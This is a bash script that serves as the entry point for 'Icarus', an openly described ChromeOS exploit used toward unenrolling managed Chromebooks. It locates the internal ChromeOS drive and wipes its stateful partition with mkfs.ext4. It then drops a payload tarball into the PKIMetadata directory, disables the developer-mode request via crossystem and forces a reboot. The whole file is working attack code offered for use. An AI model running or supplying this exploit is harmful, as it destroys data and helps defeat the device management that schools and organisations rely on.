#!/bin/bash
# icarus by writable, entry script rewrite by OlyB
# more info at https://github.com/cosmicdevv/Icarus-Lite

set -eE

SCRIPT_DATE="[2025-04-20]"
PAYLOAD=icarus.tar.gz

COLOR_RESET="\033[0m"
COLOR_YELLOW_B="\033[1;33m"

fail() {
	printf "%b\n" "$*" >&2
	exit 1
}

get_largest_cros_blockdev() {
	local largest size dev_name tmp_size remo
	size=0
	for blockdev in /sys/block/*; do
		dev_name="${blockdev##*/}"
		echo "$dev_name" | grep -q '^\(loop\|ram\)' && continue
		tmp_size=$(cat "$blockdev"/size)
		remo=$(cat "$blockdev"/removable)
		if [ "$tmp_size" -gt "$size" ] && [ "${remo:-0}" -eq 0 ]; then
			case "$(sfdisk -d "/dev/$dev_name" 2>/dev/null)" in
				*'name="STATE"'*'name="KERN-A"'*'name="ROOT-A"'*)
					largest="/dev/$dev_name"
					size="$tmp_size"
					;;
			esac
		fi
	done
	echo "$largest"
}

format_part_number() {
	echo -n "$1"
	echo "$1" | grep -q '[0-9]$' && echo -n p
	echo "$2"
}

cleanup() {
	umount "$STATEFUL_MNT" || :
}

[ -f "$PAYLOAD" ] || fail "$PAYLOAD not found!"

CROS_DEV="$(get_largest_cros_blockdev)"
[ -z "$CROS_DEV" ] && fail "No CrOS SSD found on device!"

TARGET_PART="$(format_part_number "$CROS_DEV" 1)"
[ -b "$TARGET_PART" ] || fail "$TARGET_PART is not a block device!"

clear
echo "Welcome to Icarus."
echo "Script date: ${SCRIPT_DATE}"
echo ""
echo -e "${COLOR_YELLOW_B}READ ME: https://github.com/cosmicdevv/Icarus-Lite${COLOR_RESET}"
echo ""
echo "This will destroy all data on ${TARGET_PART}."
echo "Additional steps are needed to unenroll; see above link."
echo "Note that this exploit is patched in ChromeOS r130."
echo "Continue? (y/N)"
read -r action
case "$action" in
	[yY]) : ;;
	*) fail "Abort." ;;
esac

trap 'echo $BASH_COMMAND failed with exit code $?.' ERR
trap 'cleanup; exit' EXIT
trap 'echo Abort.; cleanup; exit' INT

echo "Wiping and mounting stateful"
mkfs.ext4 -F -b 4096 -L H-STATE "$TARGET_PART" >/dev/null 2>&1
STATEFUL_MNT=$(mktemp -d)
mkdir -p "$STATEFUL_MNT"
mount "$TARGET_PART" "$STATEFUL_MNT"

mkdir -p "$STATEFUL_MNT"/unencrypted/PKIMetadata

echo -n "Extracting"
tar -xf "$PAYLOAD" -C "$STATEFUL_MNT"/unencrypted/PKIMetadata --checkpoint=.100
echo ""

echo "Cleaning up"
cleanup

crossystem disable_dev_request=1 || :
crossystem disable_dev_request=1 # grunt weirdness

echo "Finished! Press enter to reboot."
read -rs
reboot -f
sleep infinity
